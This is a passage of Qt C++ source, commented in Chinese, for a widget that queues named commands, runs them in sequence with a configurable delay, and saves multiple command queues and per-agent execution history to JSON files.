    if (pendingCommands.isEmpty()) {
        // 执行完成
        runQueueBtn->setEnabled(true);
        runQueueBtn->setText("▶ 执行");
        progressBar->setVisible(false);
        statusLabel->setText(QString("队列执行完成: %1 个命令").arg(taskQueueList->count()));
        
        // 恢复队列项颜色
        for (int i = 0; i < taskQueueList->count(); ++i) {
            taskQueueList->item(i)->setForeground(QColor("#d4d4d4"));
        }
        return;
    }
    
    // 取出第一个命令执行
    auto pair = pendingCommands.takeFirst();
    
    // 更新进度
    int completed = progressBar->maximum() - pendingCommands.count();
    progressBar->setValue(completed);
    statusLabel->setText(QString("执行中 [%1/%2]: %3").arg(completed).arg(progressBar->maximum()).arg(pair.second));
    
    // 高亮当前执行的队列项
    if (completed > 0 && completed <= taskQueueList->count()) {
        taskQueueList->item(completed - 1)->setForeground(QColor("#4ec9b0"));
    }
    
    // 执行命令
    executeDirectCommand(pair.first, pair.second);
    
    // 延迟执行下一个
    int delay = delaySpinBox->value() * 1000;
    if (delay > 0) {
        QTimer::singleShot(delay, this, &TacticalWidget::processQueueNext);
    } else {
        QTimer::singleShot(100, this, &TacticalWidget::processQueueNext);
    }
}

// ==================== 多队列管理 ====================

void TacticalWidget::onAddToQueueByName(const QString& queueName)
{
    // 临时切换到指定队列
    QString prevQueue = currentQueueName;
    int idx = queueSelector->findText(queueName);
    if (idx >= 0) {
        queueSelector->setCurrentIndex(idx);
    }
    
    // 添加命令
    onAddToQueue();
    
    // 同步到队列数据
    syncUIToQueue();
    
    // 切回原队列
    if (prevQueue != queueName) {
        idx = queueSelector->findText(prevQueue);
        if (idx >= 0) {
            queueSelector->setCurrentIndex(idx);
        }
    }
}

void TacticalWidget::onAddQueue()
{
    bool ok;
    QString name = QInputDialog::getText(this, "新建队列", "队列名称:", 
                                         QLineEdit::Normal, "", &ok);
    if (!ok || name.isEmpty()) return;
    
    // 检查是否已存在
    if (taskQueues.contains(name)) {
        QMessageBox::warning(this, "新建队列", "队列名称已存在");
        return;
    }
    
    // 保存当前队列
    syncUIToQueue();
    
    // 创建新队列
    taskQueues[name] = QList<QPair<QString, QString>>();
    queueSelector->addItem(name);
    queueSelector->setCurrentText(name);
    
    saveQueues();
    statusLabel->setText(QString("已创建队列: %1").arg(name));
}

void TacticalWidget::onDeleteQueue()
{
    if (queueSelector->count() <= 1) {
        QMessageBox::information(this, "删除队列", "至少保留一个队列");
        return;
    }
    
    QString name = queueSelector->currentText();
    QMessageBox::StandardButton reply = QMessageBox::question(
        this, "删除队列",
        QString("确定要删除队列 \"%1\" 吗？").arg(name),
        QMessageBox::Yes | QMessageBox::No
    );
    
    if (reply != QMessageBox::Yes) return;
    
    // 删除队列
    taskQueues.remove(name);
    queueSelector->removeItem(queueSelector->currentIndex());
    
    saveQueues();
    statusLabel->setText(QString("已删除队列: %1").arg(name));
}

void TacticalWidget::onQueueChanged(int index)
{
    if (index < 0) return;
    
    // 保存当前队列到数据
    if (!currentQueueName.isEmpty()) {
        syncUIToQueue();
    }
    
    // 切换到新队列
    currentQueueName = queueSelector->itemText(index);
    
    // 从数据加载到 UI
    syncQueueToUI();
    
    queueStatusLabel->setText(QString("%1 个任务").arg(taskQueueList->count()));
}

void TacticalWidget::syncQueueToUI()
{
    taskQueueList->clear();
    
    if (!taskQueues.contains(currentQueueName)) return;
    
    const auto& commands = taskQueues[currentQueueName];
    for (int i = 0; i < commands.size(); ++i) {
        const auto& pair = commands[i];
        auto item = new QListWidgetItem(QString("%1. %2").arg(i + 1).arg(pair.second));
        item->setData(Qt::UserRole, pair.first);      // cmd
        item->setData(Qt::UserRole + 1, pair.second); // name
        item->setToolTip(pair.first);
        taskQueueList->addItem(item);
    }
}

void TacticalWidget::syncUIToQueue()
{
    if (currentQueueName.isEmpty()) return;
    
    QList<QPair<QString, QString>> commands;
    for (int i = 0; i < taskQueueList->count(); ++i) {
        QListWidgetItem* item = taskQueueList->item(i);
        QString cmd = item->data(Qt::UserRole).toString();
        QString name = item->data(Qt::UserRole + 1).toString();
        commands.append({cmd, name});
    }
    taskQueues[currentQueueName] = commands;
}

// ==================== 执行历史持久化 ====================

void TacticalWidget::saveHistory()
{
    QJsonArray historyArray;
    
    // 遍历结果树，保存历史记录（最多保存100条）
    int count = 0;
    for (int i = resultTree->topLevelItemCount() - 1; i >= 0 && count < 100; --i) {
        QTreeWidgetItem* taskItem = resultTree->topLevelItem(i);
        
        QJsonObject taskObj;
        taskObj["command"] = taskItem->text(0);
        taskObj["status"] = taskItem->text(1);
        taskObj["time"] = taskItem->text(2);
        
        // 保存子项（agent执行结果）
        QJsonArray agentsArray;
        for (int j = 0; j < taskItem->childCount(); ++j) {
            QTreeWidgetItem* agentItem = taskItem->child(j);
            QJsonObject agentObj;
            agentObj["agent"] = agentItem->text(0);
            agentObj["status"] = agentItem->text(1);
            agentObj["time"] = agentItem->text(2);
            agentObj["agent_id"] = agentItem->data(0, Qt::UserRole).toString();
            agentObj["task_id"] = agentItem->data(0, Qt::UserRole + 1).toString();
            agentsArray.append(agentObj);
        }
        taskObj["agents"] = agentsArray;
        
        historyArray.append(taskObj);
        count++;
    }
    
    QJsonDocument doc(historyArray);
    QFile file(historyFile);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(doc.toJson(QJsonDocument::Compact));
        file.close();
    }
}

void TacticalWidget::loadHistory()
{
    QFile file(historyFile);
    if (!file.exists() || !file.open(QIODevice::ReadOnly)) {
        return;
    }
    
    QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
    file.close();
    
    if (!doc.isArray()) return;
    
    QJsonArray historyArray = doc.array();
    
    // 按逆序添加（最新的在最后）
    for (int i = historyArray.size() - 1; i >= 0; --i) {
        QJsonObject taskObj = historyArray[i].toObject();
        
        auto taskItem = new QTreeWidgetItem(resultTree);
        taskItem->setText(0, taskObj["command"].toString());
        taskItem->setText(1, taskObj["status"].toString());
        taskItem->setText(2, taskObj["time"].toString());
        
        // 根据状态设置颜色
        QString status = taskObj["status"].toString();
        if (status.contains("完成")) {
            taskItem->setForeground(1, QColor("#6a9955"));
        } else if (status.contains("错误")) {
            taskItem->setForeground(1, QColor("#f44747"));
        }
        
        // 加载子项
        QJsonArray agentsArray = taskObj["agents"].toArray();
        for (const QJsonValue& agentVal : agentsArray) {
            QJsonObject agentObj = agentVal.toObject();
            
            auto agentItem = new QTreeWidgetItem(taskItem);
            agentItem->setText(0, agentObj["agent"].toString());
            agentItem->setText(1, agentObj["status"].toString());
            agentItem->setText(2, agentObj["time"].toString());
            agentItem->setData(0, Qt::UserRole, agentObj["agent_id"].toString());
            agentItem->setData(0, Qt::UserRole + 1, agentObj["task_id"].toString());
            
            QString agentStatus = agentObj["status"].toString();
            if (agentStatus.contains("完成")) {
                agentItem->setForeground(1, QColor("#6a9955"));
            } else if (agentStatus.contains("错误")) {
                agentItem->setForeground(1, QColor("#f44747"));
            }
        }
    }
}

// ==================== 队列持久化 ====================

void TacticalWidget::saveQueues()
{
    // 先同步当前 UI 到队列数据
    syncUIToQueue();
    
    QJsonObject root;
    root["currentQueue"] = currentQueueName;
    
    QJsonObject queuesObj;
    for (auto it = taskQueues.begin(); it != taskQueues.end(); ++it) {
        QJsonArray cmdsArray;
        for (const auto& pair : it.value()) {
            QJsonObject cmdObj;
            cmdObj["cmd"] = pair.first;
            cmdObj["name"] = pair.second;
            cmdsArray.append(cmdObj);
        }
        queuesObj[it.key()] = cmdsArray;
    }
    root["queues"] = queuesObj;
    
    QJsonDocument doc(root);
    QFile file(queuesFile);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(doc.toJson(QJsonDocument::Compact));
        file.close();
    }
}

void TacticalWidget::loadQueues()
{
    QFile file(queuesFile);
    if (!file.exists() || !file.open(QIODevice::ReadOnly)) {
        return;
    }
    
    QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
    file.close();
    
    if (!doc.isObject()) return;
    
    QJsonObject root = doc.object();
    QString savedCurrentQueue = root["currentQueue"].toString();
    QJsonObject queuesObj = root["queues"].toObject();
    
    // 清空现有数据
    taskQueues.clear();
    queueSelector->blockSignals(true);
    queueSelector->clear();
    
    // 加载队列
    for (auto it = queuesObj.begin(); it != queuesObj.end(); ++it) {
        QString queueName = it.key();
        QJsonArray cmdsArray = it.value().toArray();
        
        QList<QPair<QString, QString>> commands;
        for (const QJsonValue& val : cmdsArray) {
            QJsonObject cmdObj = val.toObject();
            commands.append({cmdObj["cmd"].toString(), cmdObj["name"].toString()});
        }
        
        taskQueues[queueName] = commands;
        queueSelector->addItem(queueName);
    }
    
    // 如果没有队列，创建默认队列
    if (taskQueues.isEmpty()) {
        currentQueueName = "默认队列";
        taskQueues[currentQueueName] = QList<QPair<QString, QString>>();
        queueSelector->addItem(currentQueueName);
    } else {
        // 恢复当前队列选择
        int idx = queueSelector->findText(savedCurrentQueue);
        if (idx >= 0) {
            queueSelector->setCurrentIndex(idx);
            currentQueueName = savedCurrentQueue;
        } else {
            currentQueueName = queueSelector->itemText(0);
        }
    }
    
    queueSelector->blockSignals(false);
    
    // 加载当前队列到 UI
    syncQueueToUI();
    queueStatusLabel->setText(QString("%1 个任务").arg(taskQueueList->count()));
}
